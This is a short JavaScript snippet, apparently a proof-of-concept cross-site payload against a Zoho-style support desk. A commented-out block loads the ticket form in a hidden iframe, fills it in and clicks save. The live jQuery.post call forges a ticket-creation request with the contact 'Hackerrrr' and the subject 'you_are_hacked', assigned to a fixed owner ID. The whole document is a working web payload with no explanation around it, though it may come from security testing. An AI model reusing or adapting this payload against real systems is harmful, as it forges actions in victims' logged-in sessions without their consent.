//Adding Ticket

// var iframe = jQuery("<iframe></iframe>");
// jQuery(iframe).attr("src","Create.do?module=Cases");
// jQuery(iframe).attr("onload","add_Ticket()");

// jQuery("body").append(iframe);

// function add_Ticket(){
// jQuery(iframe).contents().find("input:text").val('hack@jhj.com') ;
// jQuery(iframe).contents().find('#saveButtonId').click();
// }



 jQuery.post("https://supportsecurity.localzoho.com/support/bhagia/CreateCommonModule.do", { 'rowCount':'1','ActionType':'Create','previousPage':'false','operation':'create', 'property(Department)':'101000000038087','property(Contact Name)':'Hackerrrr','property(newAutoLookup_property(Contact Name)_7)':'true','property(newAutoLookup_property(Account Name)_4)':'false', 'property(Subject)':'you_are_hacked','property(Status)':'Open','property(Case Owner)':'029b5b43e46c5b76f326e0503f6e5508', 'property(ownerId)':'029b5b43e46c5b76f326e0503f6e5508', 'property(newAutoLookup_property(Product Name)_6)':'false', 'property(Mode)':'Phone','property(module)':'Cases','module':'Cases', 'currentModule':'Cases', 'uhome':'requestqueue'});


